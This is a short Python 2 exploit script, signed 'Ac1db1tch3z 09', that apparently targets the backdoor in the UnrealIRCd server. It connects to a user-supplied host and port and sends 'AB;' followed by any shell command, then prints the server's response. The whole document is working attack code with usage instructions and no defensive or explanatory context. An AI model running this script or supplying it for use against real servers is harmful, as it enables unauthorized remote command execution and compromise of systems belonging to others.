#!/usr/bin/env python
# Ac1db1tch3z 09 

import sys
import socket
import struct

def injectcode(host, port, command):

	host1 = host
	port1 = int(port)
	cmd   = command

	print "!#@#@! Ac1db1tch3z is just Unreal #@!#%%\n"
	print "- Attacking %s on port %d"%(host1,port1)
	print "- sending command: %s"%cmd

	packet = "AB" +";"+ cmd + ";"+"\n"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host1, port1))
        except socket.error:
            print "No connection..."
            return 0
        s.sendall(packet)
	blah = s.recv(5000)
	print blah
        s.close()

if __name__ == "__main__":
	if len(sys.argv) == 1:
		print "Usage:", sys.argv[0], "<target host> <target port> <command>"
		print
		sys.exit(1)
	else:
		injectcode(sys.argv[1],sys.argv[2],sys.argv[3])


